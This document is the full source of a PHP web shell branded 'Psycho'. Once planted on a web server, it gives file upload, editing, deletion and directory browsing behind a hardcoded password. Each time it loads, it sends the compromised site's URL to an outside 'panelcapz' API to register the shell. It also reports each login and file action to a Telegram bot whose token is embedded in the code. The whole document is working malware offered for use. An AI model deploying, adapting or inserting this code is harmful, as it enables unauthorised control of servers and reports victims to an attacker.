<?php
session_start();

// === CONFIG ===
$botToken = '8168689463:AAEMWd0rLesCHu10NGepKDpbfV0Pw59skoI';
$chatId = '6664061200';
$panelApi = 'https://jinji666.store/panelcapz/api.php?action=add_shell';
$username = 'admin';
$password = '@haloo123';

// === FUNCTIONS ===
function sendTelegram($message) {
    global $botToken, $chatId;
    @file_get_contents("https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".urlencode($message));
}

function postToPanel($url, $data) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
    } else {
        $opts = array('http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5,
        ));
        $context = stream_context_create($opts);
        @file_get_contents($url, false, $context);
    }
}

// === AUTO SUBMIT URL TO PANEL ===
$fullUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
postToPanel($panelApi, array('url' => $fullUrl));

// === AUTH ===
if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['user']) && isset($_POST['pass'])) {
        if ($_POST['user'] === $username && $_POST['pass'] === $password) {
            $_SESSION['loggedin'] = true;
            sendTelegram("[LOGIN SUCCESS]\nURL: ".$fullUrl."\nIP: ".$_SERVER['REMOTE_ADDR']);
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            sendTelegram("[LOGIN FAILED]\nIP: ".$_SERVER['REMOTE_ADDR']);
        }
    }
    echo '<html><head><title>Psycho - Login</title><style>
    body{background:#111;color:#0f0;font-family:monospace;text-align:center;margin-top:100px;}
    input{background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px;}
    .login-btn{background:#0f0;color:#000;padding:10px 20px;margin-top:10px;cursor:pointer;}
    .login-btn:hover{background:#090;}
    .title{animation:glow 1s ease-in-out infinite alternate;}
    @keyframes glow{from{text-shadow:0 0 10px #0f0;}to{text-shadow:0 0 20px #0f0;}}
    </style></head><body>
    <h1 class="title">Psycho</h1>
    <form method="post">
    <input type="text" name="user" placeholder="Username"><br>
    <input type="password" name="pass" placeholder="Password"><br>
    <button class="login-btn" type="submit">Login</button>
    </form><div style="margin-top:30px;font-size:12px;">Coded by @Pyscho21</div>
    </body></html>';
    exit;
}

// === SHELL UI ===
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!file_exists($path)) $path = getcwd();
chdir($path);
$files = scandir('.');

// === HANDLE FILE ACTIONS ===
if (isset($_FILES['upload'])) {
    if (@move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name'])) {
        sendTelegram("[UPLOAD] ".$_FILES['upload']['name']." at ".getcwd());
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
        sendTelegram("[DELETE FILE] $target at ".getcwd());
    } elseif (is_dir($target)) {
        rmdir($target);
        sendTelegram("[DELETE DIR] $target at ".getcwd());
    }
    header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode(getcwd()));
    exit;
}

if (isset($_POST['newfile'])) {
    file_put_contents($_POST['newfile'], '');
    sendTelegram("[CREATE FILE] ".$_POST['newfile']." at ".getcwd());
    header("Location: ".$_SERVER['PHP_SELF']."?edit=".urlencode($_POST['newfile']));
    exit;
}

if (isset($_POST['newdir'])) {
    mkdir($_POST['newdir']);
    sendTelegram("[CREATE DIR] ".$_POST['newdir']." at ".getcwd());
    header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode(getcwd()));
    exit;
}

if (isset($_GET['edit'])) {
    $target = $_GET['edit'];
    if (isset($_POST['content'])) {
        file_put_contents($target, $_POST['content']);
        sendTelegram("[EDIT FILE] $target at ".getcwd());
        header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode(getcwd()));
        exit;
    }
    echo '<html><head><title>Edit '.$target.'</title><style>
    body{background:#111;color:#0f0;font-family:monospace;margin:20px;}
    textarea{width:100%;height:80vh;background:#222;color:#0f0;border:1px solid #0f0;padding:10px;}
    .btn{background:#0f0;color:#000;padding:10px;margin-top:10px;cursor:pointer;}
    .btn:hover{background:#090;}
    </style></head><body>
    <form method="post">
    <textarea name="content">'.htmlspecialchars(file_get_contents($target)).'</textarea><br>
    <button class="btn" type="submit">Save</button>
    <a class="btn" href="?path='.urlencode(getcwd()).'">Cancel</a>
    </form></body></html>';
    exit;
}

if (isset($_POST['renamefrom']) && isset($_POST['renameto'])) {
    rename($_POST['renamefrom'], $_POST['renameto']);
    sendTelegram("[RENAME] ".$_POST['renamefrom']." to ".$_POST['renameto']." at ".getcwd());
    header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode(getcwd()));
    exit;
}

// === SHELL DISPLAY ===
echo '<html><head><title>Psycho Panel</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>
body{background:#111;color:#0f0;font-family:monospace;margin:10px;}
a{color:#0f0;text-decoration:none;}
a.folder{font-weight:bold;color:#0ff;}
table{width:100%;border-collapse:collapse;}
td,th{border:1px solid #0f0;padding:8px;text-align:left;word-break:break-word;}
form.inline{display:inline;}
input,button{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;margin:5px;}
button{cursor:pointer;}
button:hover{background:#090;}
@media(max-width:600px){td,th{font-size:12px;}}
</style></head><body>';

echo '<h1>Psycho</h1><div>';
echo '<form method="post" enctype="multipart/form-data" class="inline">
<input type="file" name="upload"><button type="submit">Upload</button></form>';
echo '<form method="post" class="inline">
<input type="text" name="newfile" placeholder="New File"><button type="submit">New File</button></form>';
echo '<form method="post" class="inline">
<input type="text" name="newdir" placeholder="New Dir"><button type="submit">New Dir</button></form>';
echo '<form method="post" action="?logout=1" class="inline">
<button type="submit">Logout</button></form>';
echo '</div><a href="?path='.urlencode(dirname($path)).'">[Back]</a>';

echo '<table><tr><th>Name</th><th>Action</th></tr>';
foreach($files as $file){
    if ($file == '.') continue;
    echo '<tr><td>';
    if (is_dir($file)) {
        echo '<a class="folder" href="?path='.urlencode(realpath($file)).'">'.$file.'</a>';
    } else {
        echo '<a href="?edit='.urlencode($file).'">'.$file.'</a>';
    }
    echo '</td><td>';
    echo '<form method="post" action="?rename=1" class="inline">
    <input type="hidden" name="renamefrom" value="'.$file.'">
    <input type="text" name="renameto" placeholder="New name">
    <button type="submit">Rename</button></form>';
    echo '<a href="?delete='.urlencode($file).'">Delete</a>';
    echo '</td></tr>';
}
echo '</table></body></html>';

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
?>
